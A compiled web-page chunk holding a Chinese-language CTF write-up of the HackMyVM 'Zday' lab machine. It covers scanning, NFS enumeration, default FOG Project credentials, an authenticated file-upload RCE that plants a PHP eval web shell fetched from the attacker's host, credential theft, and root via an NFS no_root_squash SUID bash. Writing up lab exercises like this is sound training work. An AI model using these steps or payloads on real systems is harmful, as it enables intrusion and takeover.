"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[909],{55461:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>a,toc:()=>d});const a=JSON.parse('{"id":"HackMyVM/Machines/Zday/index","title":"Zday","description":"[Linux VM] [Tested on VirtualBox] created by || sml","source":"@site/docs/HackMyVM/Machines/Zday/index.md","sourceDirName":"HackMyVM/Machines/Zday","slug":"/HackMyVM/Machines/Zday/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Zday/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Zday/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"XMAS","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/XMAS/"},"next":{"title":"Zeug","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Zeug/"}}');var t=s(74848),r=s(28453);const o={},i="Zday",c={},d=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"NFS Services",id:"nfs-services",level:2},{value:"Web Service - FOG Project",id:"web-service---fog-project",level:2},{value:"Database",id:"database",level:2},{value:"User fogproject",id:"user-fogproject",level:2},{value:"NFS \u6743\u9650\u7f3a\u9677",id:"nfs-\u6743\u9650\u7f3a\u9677",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function l(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"zday",children:"Zday"})}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-03-10"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // d063006d028454c036c08ec7110667ff"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 62"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 61"}),(0,t.jsx)(n.p,{children:"\ud83d\udcdd Notes //\nHack and Fun!"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.130\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap --min-rate=2000 -v -A -p- 192.168.56.130\nNmap scan report for bogon (192.168.56.130)\nHost is up (0.0017s latency).\nNot shown: 65524 closed tcp ports (reset)\nPORT      STATE SERVICE  VERSION\n21/tcp    open  ftp      vsftpd 3.0.3\n22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 ee:01:82:dc:7a:00:0e:0e:fc:d9:08:ca:d8:7e:e5:2e (RSA)\n|   256 44:af:47:d8:9f:ea:ae:3e:9f:aa:ec:1d:fb:22:aa:0f (ECDSA)\n|_  256 6a:fb:b4:13:64:df:6e:75:b2:b9:4e:f1:92:97:72:30 (ED25519)\n80/tcp    open  http     Apache httpd 2.4.38 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.38 (Debian)\n| http-methods:\n|_  Supported Methods: GET POST OPTIONS HEAD\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      42139/tcp6  mountd\n|   100005  1,2,3      43941/tcp   mountd\n|   100005  1,2,3      54136/udp6  mountd\n|   100005  1,2,3      58768/udp   mountd\n|   100021  1,3,4      35181/tcp   nlockmgr\n|   100021  1,3,4      36498/udp   nlockmgr\n|   100021  1,3,4      37525/tcp6  nlockmgr\n|   100021  1,3,4      41557/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n443/tcp   open  http     Apache httpd 2.4.38\n| http-methods:\n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n2049/tcp  open  nfs      3-4 (RPC #100003)\n3306/tcp  open  mysql    MariaDB 5.5.5-10.3.27\n| mysql-info:\n|   Protocol: 10\n|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1\n|   Thread ID: 88\n|   Capabilities flags: 63486\n|   Some Capabilities: FoundRows, SupportsCompression, Speaks41ProtocolOld, ConnectWithDatabase, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSigpipes, LongColumnFlag, Support41Auth, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins\n|   Status: Autocommit\n|   Salt: 8y}&C`74<n:qNpjCQKc1\n|_  Auth Plugin Name: mysql_native_password\n35181/tcp open  nlockmgr 1-4 (RPC #100021)\n43073/tcp open  mountd   1-3 (RPC #100005)\n43941/tcp open  mountd   1-3 (RPC #100005)\n47395/tcp open  mountd   1-3 (RPC #100005)\nMAC Address: 08:00:27:63:18:72 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nUptime guess: 16.489 days (since Mon Mar 24 11:04:51 2025)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=262 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nfs-services",children:"NFS Services"}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u673a\u5668\u4e0a\u5f00\u542f\u4e86 NFS \u670d\u52a1\uff0c\u67e5\u770b\u4e00\u4e0b\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ showmount -e 192.168.56.130\nExport list for 192.168.56.130:\n/images/dev *\n/images     *\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6709\u70b9\u610f\u601d\uff0c\u6302\u8f7d\u4e00\u4e0b\u8def\u5f84"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo mkdir /mnt/HMV-Zday-images-dev\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo mount -t nfs 192.168.56.130:/images/dev /mnt/HMV-Zday-images-dev\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo mkdir /mnt/HMV-Zday-images\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo mount -t nfs 192.168.56.130:/images /mnt/HMV-Zday-images\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u6709\u54ea\u4e9b\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ls -lah /mnt/HMV-Zday-images\n\u603b\u8ba1 16K\ndrwxrwxrwx 4 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 .\ndrwxr-xr-x 4 root root 4.0K  4 \u6708 9 \u65e5 22:56 ..\ndrwxrwxrwx 3 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 dev\n-rwxrwxrwx 1 1001 root    0 2021 \u5e74 3 \u6708 10 \u65e5 .mntcheck\ndrwxrwxrwx 2 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 postdownloadscripts\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ls -lah /mnt/HMV-Zday-images-dev/\n\u603b\u8ba1 12K\ndrwxrwxrwx 3 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 .\ndrwxr-xr-x 4 root root 4.0K  4 \u6708 9 \u65e5 22:56 ..\n-rwxrwxrwx 1 1001 root    0 2021 \u5e74 3 \u6708 10 \u65e5 .mntcheck\ndrwxrwxrwx 2 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 postinitscripts\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6df1\u5165\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:'title="/mnt/HMV-Zday-images-dev/postinitscripts/fog.postinit"',children:"#!/bin/bash\n## This file serves as a starting point to call your custom pre-imaging/post init loading scripts.\n## <SCRIPTNAME> should be changed to the script you're planning to use.\n## Syntax of post init scripts are\n#. ${postinitpath}<SCRIPTNAME>\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:'title="/mnt/HMV-Zday-images/postdownloadscripts/fog.postdownload"',children:"#!/bin/bash\n## This file serves as a starting point to call your custom postimaging scripts.\n## <SCRIPTNAME> should be changed to the script you're planning to use.\n## Syntax of post download scripts are\n#. ${postdownpath}<SCRIPTNAME>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u76ee\u524d\u6765\u770b\uff0c\u5e76\u6ca1\u6709\u5b9e\u8d28\u6027\u6709\u4ef7\u503c\u7684\u4fe1\u606f"}),"\n",(0,t.jsx)(n.h2,{id:"web-service---fog-project",children:"Web Service - FOG Project"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch -u 192.168.56.130\nTarget: http://192.168.56.130/\n\n[22:52:14] Starting:\n[22:52:15] 403 -  279B  - /.ht_wsr.txt\n[22:52:15] 403 -  279B  - /.htaccess.bak1\n[22:52:15] 403 -  279B  - /.htaccess.orig\n[22:52:15] 403 -  279B  - /.htaccess.save\n[22:52:15] 403 -  279B  - /.htaccess.sample\n[22:52:15] 403 -  279B  - /.htaccess_extra\n[22:52:15] 403 -  279B  - /.htaccess_orig\n[22:52:15] 403 -  279B  - /.htaccess_sc\n[22:52:15] 403 -  279B  - /.htaccessBAK\n[22:52:15] 403 -  279B  - /.htaccessOLD2\n[22:52:15] 403 -  279B  - /.htaccessOLD\n[22:52:15] 403 -  279B  - /.htm\n[22:52:15] 403 -  279B  - /.html\n[22:52:15] 403 -  279B  - /.htpasswd_test\n[22:52:15] 403 -  279B  - /.htpasswds\n[22:52:15] 403 -  279B  - /.httr-oauth\n[22:52:16] 403 -  279B  - /.php\n[22:52:51] 302 -    0B  - /index.php  ->  /fog/index.php\n[22:52:51] 302 -    0B  - /index.php/login/  ->  /fog/index.php\n[22:53:15] 403 -  279B  - /server-status\n[22:53:15] 403 -  279B  - /server-status/\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbf\u95ee\u4e00\u4e0b ",(0,t.jsx)(n.code,{children:"http://192.168.56.130/fog/index.php"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(41445).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6709\u70b9\u610f\u601d\uff0c\u770b\u8d77\u6765\u662f\u5f00\u6e90\u7684\u4e00\u79cd\u6846\u67b6\uff0c\u7ecf\u8fc7\u5b9a\u4f4d\u53ef\u4ee5\u786e\u5b9a\u4e3a ",(0,t.jsx)(n.a,{href:"https://fogproject.org/",children:"FOG Project"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u4f7f\u7528\u9ed8\u8ba4\u7684\u51ed\u636e ",(0,t.jsx)(n.code,{children:"fog:password"})," \u53ef\u4ee5\u6210\u529f\u767b\u5f55"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(96258).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/",children:"Exploit Database"})," \u4e2d\u8fdb\u884c\u641c\u7d22"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(55158).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5229\u7528 ",(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/49811",children:"FOGProject 1.5.9 - File Upload RCE (Authenticated)"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dd if=/dev/zero of=myshell bs=10485760 count=1\n\u8f93\u5165\u4e86 1+0 \u5757\u8bb0\u5f55\n\u8f93\u51fa\u4e86 1+0 \u5757\u8bb0\u5f55\n10485760 \u5b57\u8282 (10 MB, 10 MiB) \u5df2\u590d\u5236\uff0c0.0843002 s\uff0c124 MB/s\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ echo PD9waHAgQGV2YWwoJF9SRVFVRVNUWydzaGVsbCddKSA/Pg== | base64 -d\n<?php @eval($_REQUEST['shell']) ?>\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ echo PD9waHAgQGV2YWwoJF9SRVFVRVNUWydzaGVsbCddKSA/Pg== | base64 -d >> myshell\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"http://192.168.56.130/fog/management/index.php?node=about&sub=kernel&file=aHR0cDovLzE5Mi4xNjguNTYuMTI3L215c2hlbGwK=&arch=arm64"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u5c06 ",(0,t.jsx)(n.code,{children:"Kernel Name"})," \u4fee\u6539\u4e3a ",(0,t.jsx)(n.code,{children:"myshell.php"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(95965).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f46\u662f\u5f88\u660e\u663e\u8fde\u63a5\u5931\u8d25\u4e86\uff0c\u4e25\u91cd\u6000\u7591\u662f\u7531\u4e8e\u76ee\u6807\u673a\u5668\u5728\u672c\u5730\u90e8\u7f72\u65f6\u53c2\u6570\u88ab\u4fee\u6539"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(47650).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.p,{children:"\u90a3\u4e48\u5c31\u5c1d\u8bd5\u83b7\u53d6\u7f51\u7ad9\u6240\u50a8\u5b58\u7684\u51ed\u636e"}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"http://192.168.56.130/fog/management/index.php?node=about&sub=settings"})," \u4e2d\u53ef\u4ee5\u83b7\u5f97"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(91267).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(52014).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"fogstorage:7duC22OLzHbKZAKGXzw<\nfogproject:84D1gia!8M9HSsR8gXau\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06 ftp \u7684\u914d\u7f6e\u4fee\u6539\u4e3a\u5f53\u524d\u7684 ip \u5730\u5740\u4e4b\u540e\uff0c\u7ee7\u7eed\u5c1d\u8bd5\u5229\u7528\u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(73351).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fde\u63a5\u6210\u529f"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(80537).A+"",width:"2560",height:"1540"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u8681\u5251\u8fde\u63a5\u6210\u529f"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(89523).A+"",width:"1542",height:"1040"})}),"\n",(0,t.jsx)(n.p,{children:"\u5e76\u63a2\u6d4b\u5230\u5b58\u5728\u6709\u4ee5\u4e0b\u666e\u901a\u7528\u6237"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(51068).A+"",width:"1542",height:"1040"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"estas"}),"\n",(0,t.jsx)(n.li,{children:"fogproject"}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"database",children:"Database"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u4e0a\u9762\u83b7\u53d6\u5230\u7684\u51ed\u636e\u8fde\u63a5\u5230\u6570\u636e\u5e93"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ mysql --skip-ssl -u fogstorage -h 192.168.56.130 -p\nEnter password:\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 364\nServer version: 10.3.27-MariaDB-0+deb10u1 Debian 10\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| fog                |\n| information_schema |\n+--------------------+\n2 rows in set (0.002 sec)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u67e5\u770b fog \u670d\u52a1\u7684\u6240\u6709\u6570\u636e\u8868"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"MariaDB [fog]> show tables;\n+------------------------+\n| Tables_in_fog          |\n+------------------------+\n| clientUpdates          |\n| dirCleaner             |\n| globalSettings         |\n| greenFog               |\n| groupMembers           |\n| groups                 |\n| history                |\n| hookEvents             |\n| hostAutoLogOut         |\n| hostMAC                |\n| hostScreenSettings     |\n| hosts                  |\n| imageGroupAssoc        |\n| imagePartitionTypes    |\n| imageTypes             |\n| images                 |\n| imagingLog             |\n| inventory              |\n| ipxeTable              |\n| keySequence            |\n| moduleStatusByHost     |\n| modules                |\n| multicastSessions      |\n| multicastSessionsAssoc |\n| nfsFailures            |\n| nfsGroupMembers        |\n| nfsGroups              |\n| notifyEvents           |\n| os                     |\n| oui                    |\n| plugins                |\n| powerManagement        |\n| printerAssoc           |\n| printers               |\n| pxeMenu                |\n| scheduledTasks         |\n| schemaVersion          |\n| snapinAssoc            |\n| snapinGroupAssoc       |\n| snapinJobs             |\n| snapinTasks            |\n| snapins                |\n| supportedOS            |\n| taskLog                |\n| taskStates             |\n| taskTypes              |\n| tasks                  |\n| userCleanup            |\n| userTracking           |\n| users                  |\n| virus                  |\n+------------------------+\n51 rows in set (0.001 sec)\n\nMariaDB [fog]> select * from users;\n+-----+-------+--------------------------------------------------------------+---------------------+-----------+-------+----------+-----------+-----------+\n| uId | uName | uPass                                                        | uCreateDate         | uCreateBy | uType | uDisplay | uAllowAPI | uAPIToken |\n+-----+-------+--------------------------------------------------------------+---------------------+-----------+-------+----------+-----------+-----------+\n|   1 | fog   | $2y$11$8QdmUSJOMByT3XuhhtRWsOlqydpDg8LHcnYPxr3oB3IGvfCkpuRWa | 2021-03-10 04:33:34 | fog       |     0 |          | 1         |           |\n+-----+-------+--------------------------------------------------------------+---------------------+-----------+-------+----------+-----------+-----------+\n1 row in set (0.000 sec)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6ca1\u6709\u66f4\u6df1\u5165\u7684\u6709\u4ef7\u503c\u4fe1\u606f\u4e86"}),"\n",(0,t.jsx)(n.h2,{id:"user-fogproject",children:"User fogproject"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u901a\u8fc7 SSH \u8fde\u63a5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ssh fogproject@192.168.56.130\nfogproject@192.168.56.130's password:\nLinux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Apr  9 11:22:16 2025 from 192.168.56.127\n-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)\nYou seem to be using the 'fogproject' system account to logon and work\non your FOG server system.\n\nIt's NOT recommended to use this account! Please create a new\naccount for administrative tasks.\n\nIf you re-run the installer it would reset the 'fog' account\npassword and therefore lock you out of the system!\n\nTake care,\nyour FOGproject team\nConnection to 192.168.56.130 closed.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u6307\u5b9a SSH \u7684\u5165\u53e3"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ssh fogproject@192.168.56.130 -t /bin/sh\nfogproject@192.168.56.130's password:\nbash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)\n$ whoami\nfogproject\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528 bash \u6765\u8fdb\u884c\u4ea4\u4e92\uff0c\u9700\u8981\u4fee\u6539 ",(0,t.jsx)(n.code,{children:"/home/fogproject/.bashrc"})," \u6587\u4ef6\u7684\u6700\u540e\u4e00\u884c"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"$ cat /home/fogproject/.bashrc | tail -n 2\necho -e \"You seem to be using the'fogproject'system account to logon and work \\non your FOG server system.\\n\\nIt's NOT recommended to use this account! Please create a new \\naccount for administrative tasks.\\n\\nIf you re-run the installer it would reset the 'fog' account \\npassword and therefore lock you out of the system!\\n\\nTake care, \\nyour FOGproject team\"\nexit 1\n$ vi /home/fogproject/.bashrc\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u7ee7\u7eed\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"/bin/bash"})," \u8fdb\u884c\u767b\u5f55"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs fogproject@192.168.56.130\n[23:34:25] Welcome to pwncat \ud83d\udc08!\nPassword: ********************\n[23:34:33] 192.168.56.130:22: normalizing shell path\n           192.168.56.130:22: registered new host w/ db\n(local) pwncat$ back\n(remote) fogproject@zday:/home/fogproject$ whoami\nfogproject\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nfs-\u6743\u9650\u7f3a\u9677",children:"NFS \u6743\u9650\u7f3a\u9677"}),"\n",(0,t.jsxs)(n.p,{children:["\u4e0a\u4f20 ",(0,t.jsx)(n.code,{children:"linpeas.sh"})," \u8fdb\u884c\u81ea\u52a8\u5316\u5206\u6790"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing NFS Exports Files (limit 70)\n-e Connected NFS Mounts:\nnfsd /proc/fs/nfsd nfsd rw,relatime 0 0\n-rw-r--r-- 1 root root 174 Mar 10  2021 /etc/exports\n/images *(ro,sync,no_wdelay,no_subtree_check,insecure_locks,no_root_squash,insecure,fsid=0)\n/images/dev *(rw,async,no_wdelay,no_subtree_check,no_root_squash,insecure,fsid=1)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u52a0\u4ee5\u5229\u7528"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# Machine\n(remote) fogproject@zday:/home/fogproject$ cp /bin/bash /images/dev/\n(remote) fogproject@zday:/home/fogproject$ ls -lh /images/dev/\ntotal 1.2M\n-rwxr-xr-x 1 fogproject fogproject 1.2M Apr  9 11:50 bash\ndrwxrwxrwx 2 fogproject root       4.0K Mar 10  2021 postinitscripts\n\n# Kali\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo chmod 4755 /mnt/HMV-Zday-images-dev/bash\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo chown root:root /mnt/HMV-Zday-images-dev/bash\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ls -lh /mnt/HMV-Zday-images-dev\n\u603b\u8ba1 1.2M\n-rwxr-xr-x 1 root root 1.2M  4 \u6708 9 \u65e5 23:50 bash\ndrwxrwxrwx 2 1001 root 4.0K 2021 \u5e74 3 \u6708 10 \u65e5 postinitscripts\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5373\u53ef\u83b7\u5f97 root \u6743\u9650"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) fogproject@zday:/home/fogproject$ /images/dev/bash -p\n(remote) root@zday:/home/fogproject# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-flag",metastring:'title="/home/estas/user.txt"',children:"whereihavebeen\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"ihavebeenherealways\n"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},55158:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250401-230151-808fbab4a2c60bb5d5a5801651cedc7b.png"},96258:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250408-230800-0d6841b67980df7f043d22f8c45b6d3d.png"},95965:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250408-230854-6d175b68d93e1f2d1716d48b86697820.png"},47650:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250411-231100-0606f1774b81283e7575313d2e987633.png"},91267:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250412-231243-5e0dbabc70e75b96c6064de7e5f9b640.png"},52014:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250412-231255-3dbc9e918917afdd477ad78de73fe90f.png"},73351:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250414-231429-13b11120f7ed228b24756ea577daf2c9.png"},80537:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250416-231627-7a37d52af27e4decc02eb923100e0473.png"},89523:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250417-231705-2774b175f5310ace985be2323c2779ed.png"},51068:(e,n,s)=>{s.d(n,{A:()=>a});const 